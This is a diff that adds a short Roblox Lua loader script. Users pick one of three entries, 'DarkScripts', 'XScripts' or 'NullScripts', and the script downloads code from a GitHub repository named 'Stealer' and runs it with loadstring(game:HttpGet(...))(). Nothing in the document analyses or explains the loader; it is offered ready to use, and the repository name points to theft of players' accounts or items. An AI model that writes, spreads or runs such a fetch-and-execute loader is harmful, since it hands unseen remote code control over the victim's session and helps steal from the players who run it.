@@ -1,0 +1,19 @@
+-- === EDIT THIS ===
+local SELECTED_SCRIPT = "DarkScripts"  -- Options: "DarkScripts", "XScripts", "NullScripts", "None"
+-- === END EDIT ===
+
+local SCRIPTS = {
+    DarkScripts = "https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/dark",
+    XScripts = "https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/xscripts",
+    NullScripts = "https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/Null"
+}
+
+if SELECTED_SCRIPT == "None" then
+    print("No script loaded.")
+elseif SCRIPTS[SELECTED_SCRIPT] then
+    local scriptUrl = SCRIPTS[SELECTED_SCRIPT]
+    loadstring(game:HttpGet(scriptUrl, true))()  -- Fetches & executes the script
+    print("✅ Executed: " .. SELECTED_SCRIPT)
+else
+    warn("❌ Invalid script: " .. (SELECTED_SCRIPT or "nil"))
+end
